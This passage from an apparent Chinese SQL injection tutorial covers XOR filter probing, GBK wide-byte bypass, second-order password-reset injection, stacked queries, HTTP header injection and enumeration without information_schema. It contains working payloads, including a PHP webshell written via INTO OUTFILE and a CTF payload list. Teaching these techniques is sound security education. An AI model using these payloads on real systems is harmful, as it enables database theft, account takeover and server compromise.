class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1=1 ^ 1=1 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=1 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=2 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=2 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=1 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor null as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>常用手段：用于判断 所过滤的字符串</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(0)#</span></span><br><span class="line"><span class="string"># 得到正常的回显页面，由于异或之后得到 真</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(1)<span class="comment">#</span></span><br><span class="line"><span class="comment"># 得到错误的回显页面，由于异或之后得到 假</span></span><br></pre></td></tr></table></figure><p>常常用于判断我们所注入的某些字段是否被过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>union<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure><p>如果 <code>union</code> 已被过滤，那么得到的将会是 <code>length(0&gt;0)</code> ，显然是不成立的，那就将会是 <code>1&#39;^0</code> ，得到的为 真，所以将会返回 <strong>正常</strong> 的页面；</p><p>如果 <code>union</code> 没有被过滤，相反的，将会得到为假的异或，返回的将会是 <strong>错误</strong> 的页面。</p><p>由此可以判断某些字符的过滤情况。</p><p>常常使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>select<span class="string">&#x27;)&gt;0)#</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(length(<span class="string">&#x27;and&#x27;</span>)&gt;0)<span class="comment">#</span></span><br><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>or<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure><p><strong>符号特点：</strong></p><ul><li> <code>^</code> 运算符会做位异或运算</li></ul><p>  <img src="https://i.loli.net/2021/08/21/4yJYWol36IcDBx5.png" alt="image-20210821111344451"></p><ul><li><p><code>xor</code> 做逻辑运算 <code>1 xor 0</code> 会输出 1 ，其它情况输出其余所有数据</p><p><img src="https://i.loli.net/2021/08/21/tAPRi3nBOy7E2wc.png" alt="image-20210821111509785"></p></li></ul><h2 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h2><p><strong>防御原理</strong><br>为了防止 SQL注入漏洞，通常在源代码当中会对我们所输入的 SQL查询语句进行一个 转义 ，一般是对 单引号，双引号 进行一个转义变成 &#39; 或者是&quot;，这样Mysql在 执行 SQL语句时，不会影响到查询，即不会出现报错，数据存储在数据库当中时不会含有 \ ，也就是说，它仅仅是在执行 SQL语句时进行了转义，当我们从数据库中向外调出数据时并不会含有 \ ，也就预防了 SQL注入。</p><p><img src="https://i.loli.net/2021/08/20/iSje8ohEVHtCO2M.png" alt="在这里插入图片描述"></p><p>如果我们不进行转义，按照一般 攻击者的思路进行 SQL注入，都是通过 ?id=1’ 进行验证，如下图，如果没有进行任何防御，即没有进行转义操作，就会出现报错，也就很容易的验证出来了 的确存在 SQL注入，并且容易看到注入方式。</p><p><img src="https://i.loli.net/2021/08/20/Y2sylgcHtZCRh84.png" alt="在这里插入图片描述"></p><p><strong>常使用的 转义函数：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">    单引号（<span class="string">&#x27;）</span></span><br><span class="line"><span class="string">    双引号（&quot;）</span></span><br><span class="line"><span class="string">    反斜杠（\）</span></span><br><span class="line"><span class="string">    NULL</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">mysql_real_escape_string() 函数: 转义 SQL 语句中使用的字符串中的特殊字符</span></span><br><span class="line"><span class="string">下列字符受影响：</span></span><br><span class="line"><span class="string">    \x00</span></span><br><span class="line"><span class="string">    \n</span></span><br><span class="line"><span class="string">    \r</span></span><br><span class="line"><span class="string">    \</span></span><br><span class="line"><span class="string">    &#x27;</span></span><br><span class="line">    <span class="string">&quot;</span></span><br><span class="line"><span class="string">    \x1a</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">addslashes()</span></span><br></pre></td></tr></table></figure><p><strong>解决：</strong></p><ul><li><p>网页连接数据库时，将字符编码设置为 <strong>GBK 编码集合</strong>，然后进行 SQL语句的拼接，进行数据库的查询。</p></li><li><p><strong>GBK编码采用 双字节编码，编码范围为 8140~FEFE</strong></p></li><li><p>转义字符 <code>\</code> 的编码是 <code>5c</code> ，其在 GBK的编码范围之内，如果我们在转义字符之前 提交一个同样在编码范围之内的字符，网页在解析时，就会将其与 后面的转义字符进行一个匹配，组成一个 双字节的 GBK编码的汉字，从而失去了转义的作用。</p></li><li><p><strong>常用方法：在使用单引号 或者 双引号之前添加 %df 字符</strong></p></li><li><p><strong>方法二：在使用单引号 或者 双引号之前添加 %aa%5c 字符</strong></p></li><li><p>解释：</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例如:  ?id=1%aa%5c<span class="string">&#x27; </span></span><br><span class="line"><span class="string">其实是： ?id=1%aa\&#x27;</span> </span><br><span class="line">即： ?id=1%aa%\\\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">其中 \ 是 %5c;  &#x27;</span> 是 %27</span><br><span class="line">数据库中做了转义处理之后变成：%aa%5c%5c%5c%27</span><br><span class="line">这样，%aa和%5c进行组合称为了一个汉字，%5c与%5c仍旧是 \\ ，而 %27(单引号) 就分离出来了</span><br></pre></td></tr></table></figure></li></ul><p><a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">GBK编码范围</a></p><h2 id="十二、二次注入"><a href="#十二、二次注入" class="headerlink" title="十二、二次注入"></a>十二、二次注入</h2><p><strong>根源在于：来发这信任从数据库中取出的数据都是无害的。</strong></p><blockquote><p><strong>原理</strong>：攻击者构造的恶意数据 存储在 数据库 后，恶意数据 被读取 并进入到 SQL查询语句 所导致的注入。<br>防御者可能在用户 输入 恶意数据时对其中的特殊字符进行了 <strong>转义处理</strong> ，但在恶意数据插入到数据库时被处理的数据又 <strong>被还原</strong> 并存储在数据库中，当Web程序 <strong>调用</strong> 存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>也就是说在应用程序中输入恶意造的数据库查询语句时会被转义，但是在数据库内部调用读取语句的时候又被还原。</strong></p></blockquote><blockquote><p><strong>二次注入步骤</strong>:<br>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了 <strong>转义处理</strong>，在<strong>写入数据库的时候又保留了原来的数据</strong>。<br>第二步：引用恶意数据<br><strong>开发者默认存入数据库的数据都是安全的，在进行查询即调用已存储在数据库中的数据时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</strong></p></blockquote><ul><li>一般结合 <strong>修改密码 功能点</strong>  进行利用</li></ul><p>举例：</p><ol><li><p>已知用户登陆时的查询  <code>login.php</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询防御：login.php</span><br><span class="line">$username <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>我们使用下面 <strong>用户登录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Dumb</span></span><br></pre></td></tr></table></figure><p>则实际进行操作的语句成为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;Dumb\&#x27;&#x27; and password=&#x27;</span>Dumb<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>由于进行了 <code>mysql_real_escape_string</code> 转义，则不会引发 sql 注入，从而成功进行了防御</p></li><li><p>已知注册用户时的插入 <code>login_create.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">插入防御：login_create.php</span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="variable">$username</span>\&quot;, \&quot;<span class="variable">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们 <strong>注册新的用户</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure><p>同样对我们输入的数据进行了转义处理，则实际操作语句是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username 进行转义处理之后得到 Dumb\<span class="string">&#x27;#，代入，即</span></span><br><span class="line"><span class="string">insert into users ( username, password) values(\&quot;Dumb\&#x27;</span><span class="comment">#\&quot;, \&quot;123456\&quot;)</span></span><br></pre></td></tr></table></figure><p>这样我们成功注册了一个新的用户 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure></li><li><p>已知用户修改密码  <code>pass_change.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="variable">$pass</span>&#x27; where username=&#x27;<span class="variable">$username</span>&#x27; and password=&#x27;<span class="variable">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><p>可以看到，此时的用户名没有进行转义防御就出现在了sql语句当中</p></li><li><p>我们以新注册的 <code>Dumb&#39;#</code> 用户登录进去，利用修改密码的功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">654321</span></span><br><span class="line"><span class="string">654321</span></span><br></pre></td></tr></table></figure><p>代入 sql 语句中得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;654321&#x27;</span> <span class="built_in">where</span> username=<span class="string">&#x27;Dumb&#x27;</span><span class="comment">#&#x27; and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure><p>这样看来，我们实际上修改的是 用户名为 <code>Dumb</code> 的密码</p></li><li><p>这样我们就在只以知某一用户名，不知其密码的情况下，通过 <strong>二次注入</strong> ，成功的可以登录其它用户的账号了</p></li></ol><h2 id="十三、堆叠注入"><a href="#十三、堆叠注入" class="headerlink" title="十三、堆叠注入"></a>十三、堆叠注入</h2><p>SQL语句书写时，以 分号 <code>;</code> 表示一条SQL语句结束，通过使用分号同时执行多条 SQL语句 即为 <code>堆叠注入</code> 。该注入可修改数据库的任意结构和数据。</p><p>测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;create table  qwe like users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| qwe                |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;drop table  qwe;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p><strong>堆叠注入写一句话木马文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;;select &#x27;</span>&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[111]); ?&gt;<span class="string">&#x27; into outfile &#x27;</span>/var/www/html/hacker.php<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure><p><strong>题例：[GYCTF2020]Blacklist1</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 2#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show databases;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;select database();#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show tables;</span><br><span class="line">1<span class="string">&#x27;;show columns from 表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>create table 新表名 like 已知表名;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;drop table 新表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;handler 表名 open;handler 表名 <span class="built_in">read</span> first;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="十四、HTTP-头部注入"><a href="#十四、HTTP-头部注入" class="headerlink" title="十四、HTTP 头部注入"></a>十四、HTTP 头部注入</h2><h3 id="14-1-User-Agent-注入"><a href="#14-1-User-Agent-注入" class="headerlink" title="14.1 User-Agent 注入"></a>14.1 User-Agent 注入</h3><p>源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p><p>抓包，修改 User-Agent 值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="14-2-Referer-注入"><a href="#14-2-Referer-注入" class="headerlink" title="14.2 Referer 注入"></a>14.2 Referer 注入</h3><p>源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>同样的道理：当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p><p>抓包，修改 Referer 值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Referer:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="14-3-Cookie-注入"><a href="#14-3-Cookie-注入" class="headerlink" title="14.3 Cookie 注入"></a>14.3 Cookie 注入</h3><p>如今绝大部门开发人员在开发过程中会对用户传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get，post这种方式提交的数据进行参数过滤。</p><p>但我们知道，很多时候，提交数据并非仅仅只有get / post这两种方式，还有一种经常被用到的方式：request(“xxx”),即request方法。通过这种方法一样可以从用户提交的参数中获取参数值。</p><p><strong>这就造成了cookie注入的最基本条件：使用了request方法，但是只对用户get / post提交的数据进行过滤。</strong></p><p>例如：<code>www.xx.com/search.asp?id=1</code></p><p>访问：<code>www.xx.com/srarch.asp</code>　发现不能访问，说缺少id参数。</p><p>我们试着将id=1放在cookie中再次访问，查看能否访问，如果能访问，则说明id参数可以通过cookie提交。</p><p>那么，如果后端没有对cookie中传入的数据进行过滤，那么，这个网站就有可能存在cookie注入了！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="variable">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="十五、无列名注入"><a href="#十五、无列名注入" class="headerlink" title="十五、无列名注入"></a>十五、无列名注入</h2><p> Mysql 版本 &gt; 5 时，都会存在一个元数据库 <code>information_schema</code> ，其中记录着 mysql 所有库、以及表的结构，我们通常的 sql 注入手段即是通过该元数据库来获取到其它库以及表的信息。那如果这个 <code>information_schema</code> 被过滤掉了该怎么办？</p><h3 id="15-1-使用别的具有类似功能的库"><a href="#15-1-使用别的具有类似功能的库" class="headerlink" title="15.1 使用别的具有类似功能的库"></a>15.1 使用别的具有类似功能的库</h3><p>除了 <code>information_schema</code> 中存在 <code>tables  schemata  columns  </code> 等表的信息外，在高版本当中还存在 <code>INNODB_TABLES</code>  <code>INNODS_COLUMNS</code> 中也记录着表的结构。</p><h4 id="15-1-1-sys-数据库"><a href="#15-1-1-sys-数据库" class="headerlink" title="15.1.1 sys 数据库"></a>15.1.1 sys 数据库</h4><ul><li><p><strong>利用mysql5.7新增的 sys.schema_auto_increment_columns</strong></p><p>基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</p><p>关于该表的视图    <a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html">https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html</a></p><p><img src="https://i.loli.net/2021/07/26/WcsAFo4brvGk1HQ.png" alt="image-20210726115705011"></p></li><li><p><strong>sys.schema_table_statistics_with_buffer</strong></p><p><img src="https://i.loli.net/2021/07/26/lIYZEAwComGO9an.png" alt="image-20210726115902236"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用语句</span><br><span class="line"></span><br><span class="line">#查数据库</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_auto_increment_columns;　　</span><br><span class="line">#查表</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database();　　</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><p>类似的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">与它表结构相似的视图还有</span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics_with_buffer</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$ps_schema_table_statistics_io</span></span><br><span class="line">    </span><br><span class="line">参考：https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-redundant-indexes.html</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/26/waSdL9Z8jpWcKbQ.png" alt="image-20210726120047304"></p></li></ul><h4 id="15-1-2-mysql-默认存储引擎-INNODB-所携带的表"><a href="#15-1-2-mysql-默认存储引擎-INNODB-所携带的表" class="headerlink" title="15.1.2 mysql 默认存储引擎 INNODB 所携带的表"></a>15.1.2 mysql 默认存储引擎 INNODB 所携带的表</h4><ul><li><strong>mysql.innodb_table_stats</strong></li><li><strong>mysql.innodb_index_stats</strong></li></ul><p><img src="https://i.loli.net/2021/07/26/y9D2XuApPm5wYGW.png" alt="image-20210726120244786"></p><p><img src="https://i.loli.net/2021/07/26/YR5okn6FbNxaZBQ.png" alt="image-20210726120309138"></p><h3 id="15-2-union-select-构造虚表"><a href="#15-2-union-select-构造虚表" class="headerlink" title="15.2 union select 构造虚表"></a>15.2 union select 构造虚表</h3><p>实验：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from `users`;</span><br><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 